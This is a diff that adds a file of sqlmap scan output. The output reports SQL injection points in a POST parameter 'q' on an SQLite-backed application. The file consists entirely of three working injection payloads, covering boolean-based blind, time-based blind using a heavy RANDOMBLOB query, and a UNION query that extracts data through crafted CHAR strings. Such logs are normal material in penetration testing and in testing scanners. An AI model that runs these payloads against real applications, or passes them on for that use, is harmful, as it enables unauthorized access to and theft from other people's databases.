@@ -1,0 +1,16 @@
+sqlmap identified the following injection point(s) with a total of 242 HTTP(s) requests:
+---
+Parameter: q (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: q=test' OR NOT 9031=9031-- qLkp
+
+    Type: time-based blind
+    Title: SQLite > 2.0 OR time-based blind (heavy query)
+    Payload: q=test' OR 9274=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- Wyri
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: q=test' UNION ALL SELECT NULL,CHAR(113,122,106,112,113)||CHAR(83,102,73,66,102,68,87,84,115,78,116,82,105,98,117,118,75,100,90,89,107,112,104,90,105,112,106,122,111,71,76,74,107,113,97,86,97,78,68,87)||CHAR(113,106,122,120,113)-- nubf
+---
+back-end DBMS: SQLite
